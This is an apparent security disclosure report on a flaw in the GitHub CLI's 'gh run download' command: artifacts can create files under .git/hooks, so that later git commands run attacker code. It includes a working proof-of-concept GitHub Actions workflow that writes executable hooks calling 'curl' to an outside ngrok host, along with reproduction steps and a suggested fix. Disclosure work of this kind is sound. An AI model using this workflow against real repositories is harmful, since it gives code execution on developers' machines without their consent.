# CLI: implementation of `gh run download` command allows creating local git hooks leading to code execution on user device

Hi there!

https://github.com/Metnew

## Dev

```
git clone https://github.com/Metnew/gh_run_download_git_artifacts ./poc
cd poc
gh run download
git checkout
```

## Description: 

```
USAGE
  gh run download [<run-id>] [flags]

FLAGS
  -D, --dir string         The directory to download artifacts into (default ".")
```

By default, `gh run download` command puts artifacts in the current dir. It can't overwrite files though, only create new ones. There also no restrictions on the name of the files to be written (except for the path traversal check).

It means, it's possible to craft a malicious archive of artifacts that creates new files under `<root>/.git/*` upon `gh run download`. Achieving code execution is simple in this case, we can just write git hooks to `<root>/.git/hooks/*`. 

> Or `<root>/.git/modules/<module>/hooks` if any submodule is present.

> I can't imagine someone managing to have all of possible client-side git hooks (even non-standard!) configured, so there always be a place for a malicious one (+ git-p4* hooks). 
```
applypatch-msg        pre-commit
commit-msg            pre-merge
fsmonitor-watchman    pre-merge-commit
post-applypatch       pre-push
post-checkout         pre-rebase
post-index-change     pre-receive
post-merge            prepare-commit-msg
post-rewrite          push-to-checkout
post-update           reference-transaction
pre-applypatch        sendemail-validate
pre-auto-gc           update
```

## Triggering code execution
Malicious code will be executed upon almost any porcelain git command.
`git fetch`, `pull`, `push`, `checkout`, `commit`, `merge`, `rebase`, `am` **and even on** `git add/rm`!

## Crafting a repo producing malicious artifacts
> See {f} for a poc git repo that has Github actions producing malicious artifacts.

`.github/workflows/action.yaml` produces malicious artifacts.
```
name: Crafting some malware here

on: [push]

jobs:
  build_and_test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2
      - run: |
          rm -rf .git/*
          mkdir -p .git/hooks
          export PAYLOAD="curl https://metnew.ngrok.io"
          declare -a arr=("applypatch-msg" "pre-commit" "commit-msg" "pre-merge" "fsmonitor-watchman" "pre-merge-commit" "post-applypatch" "pre-push" "post-checkout" "pre-rebase" "post-index-change" "pre-receive" "post-merge" "prepare-commit-msg" "post-rewrite" "push-to-checkout" "post-update" "reference-transaction" "pre-applypatch" "sendemail-validate" "pre-auto-gc" "update")
          echo "$PAYLOAD"
          for i in "${arr[@]}"
          do
             echo "$PAYLOAD/$i" > ".git/hooks/$i"
             chmod +x ".git/hooks/$i"
          done
      - name: Archive production artifacts
        uses: actions/upload-artifact@v2
        with:
          name: artifacts
          path: |
            ./
```


## Steps to Reproduce:

1. Craft a malicious repository
2. `gh repo clone <you>/<repo>`
3. `gh run download 1`
4. `git add ./` OR `git fetch` OR `git checkout -b newbranch`

## How to fix?

Make `gh run download` writing in a folder if `.git` is already present OR ignore `.git/*` files if they're present in the artifacts.